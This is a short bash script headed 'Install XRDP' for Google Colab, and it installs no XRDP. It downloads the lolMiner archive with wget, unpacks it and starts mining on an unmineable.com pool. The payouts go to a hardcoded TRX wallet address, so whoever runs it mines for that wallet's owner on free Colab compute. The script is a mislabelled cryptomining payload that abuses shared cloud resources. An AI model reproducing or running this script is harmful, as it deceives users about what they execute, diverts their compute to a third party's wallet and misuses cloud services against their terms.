#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz
tar xvzf lolMiner_v1.48_Lin64.tar.gz
cd 1.48
./lolMiner  --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TBom3chnoWAncM7QHMa4mMGZMhCJtaNy3w:name --ethstratum ETHPROXY pause 
